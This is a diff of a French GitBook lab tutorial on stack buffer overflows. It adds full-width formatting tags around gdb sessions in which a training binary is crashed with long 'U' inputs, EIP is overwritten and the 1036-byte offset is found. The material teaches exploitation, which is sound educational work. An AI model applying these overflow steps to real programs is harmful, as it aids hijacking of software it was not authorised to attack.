@@ -8,6 +8,7 @@ Un des aspects les plus importants d'un débordement de tampon basé sur la pile
 
 #### <mark style="color:green;">Prendre le Contrôle d'EIP</mark>
 
+{% code fullWidth="true" %}
 ```bash
 student@nix-bow:~$ gdb -q bow32
 
@@ -17,11 +18,13 @@ Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1200")
 Program received signal SIGSEGV, Segmentation fault.
 0x55555555 in ?? ()
 ```
+{% endcode %}
 
 Si nous insérons 1200 "U" (hex "55") comme entrée, nous pouvons voir à partir des informations du registre que nous avons écrasé l'EIP. Comme nous le savons, l'EIP pointe vers la prochaine instruction à exécuter.
 
 #### <mark style="color:green;">Prendre le Contrôle d'EIP</mark>
 
+{% code fullWidth="true" %}
 ```bash
 (gdb) info registers 
 
@@ -42,6 +45,7 @@ es             0x2b	43
 fs             0x0	0
 gs             0x63	99
 ```
+{% endcode %}
 
 <figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -113,6 +117,7 @@ Si nous utilisons maintenant précisément ce nombre d'octets pour nos "U", nous
 
 #### <mark style="color:green;">Décalage GDB</mark>
 
+{% code fullWidth="true" %}
 ```bash
 (gdb) run $(python -c "print '\x55' * 1036 + '\x66' * 4")
 
@@ -123,6 +128,7 @@ Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1036 + '\x
 Program received signal SIGSEGV, Segmentation fault.
 0x66666666 in ?? ()
 ```
+{% endcode %}
 
 <figure><img src="../../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
